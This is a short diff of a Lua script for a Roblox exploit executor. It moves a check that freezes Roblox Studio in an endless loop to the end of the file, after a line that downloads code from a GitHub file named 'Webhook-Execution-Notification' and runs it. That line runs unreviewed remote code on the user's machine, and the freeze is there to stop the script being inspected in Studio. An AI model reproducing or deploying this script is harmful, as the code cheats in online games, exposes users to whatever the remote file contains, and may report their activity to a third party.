@@ -1,7 +1,3 @@
-if identifyexecutor() and identifyexecutor() == "RobloxStudio.exe" then
-	while true do end
-	game:Shutdown()
-end
 
 if not HttpsProtect then
 	HttpsProtect = {
@@ -139,4 +135,8 @@ spawn(function()
 end)
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/Webhook-Execution-Notification'),true))()
+if identifyexecutor() and identifyexecutor() == "RobloxStudio.exe" then
+	while true do end
+	game:Shutdown()
+end
 
